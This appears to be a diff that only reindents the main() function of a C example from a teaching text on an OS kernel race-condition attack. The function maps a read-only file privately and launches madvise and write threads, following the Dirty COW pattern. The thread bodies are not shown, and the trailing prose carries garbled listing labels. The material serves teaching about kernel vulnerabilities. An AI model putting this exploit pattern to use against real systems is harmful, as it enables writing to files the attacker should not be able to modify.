@@ -50,20 +50,20 @@ condition vulnerability in the OS kernel.
 void *map;
 int main(int argc, char *argv[])
 {
-pthread_t pth1,pth2;
-struct stat st;
-// Open the file in read only mode. int 
-f=open("/zzz", O_RDONLY);
-// Open with PROT_READ.
-fstat(f, &st);
-map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
-// We have to do the attack using two threads.
-pthread_create(&pth1, NULL, madviseThread, NULL); (*@Line 1@*)
-pthread_create(&pth2, NULL, writeThread, TARGET_CONTENT); (*@Line 2@*)
-// Wait for the threads to finish. 
-pthread_join(pth1, NULL); 
-pthread_join(pth2, NULL);
-return 0;
+  pthread_t pth1,pth2;
+  struct stat st;
+  // Open the file in read only mode. int 
+  f=open("/zzz", O_RDONLY);
+  // Open with PROT_READ.
+  fstat(f, &st);
+  map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+  // We have to do the attack using two threads.
+  pthread_create(&pth1, NULL, madviseThread, NULL); (*@Line 1@*)
+  pthread_create(&pth2, NULL, writeThread, TARGET_CONTENT); (*@Line 2@*)
+  // Wait for the threads to finish. 
+  pthread_join(pth1, NULL); 
+  pthread_join(pth2, NULL);
+  return 0;
 }
 ```
 In the above code, we start two threads: madviseThread (Line À) and writeThread (Line `)
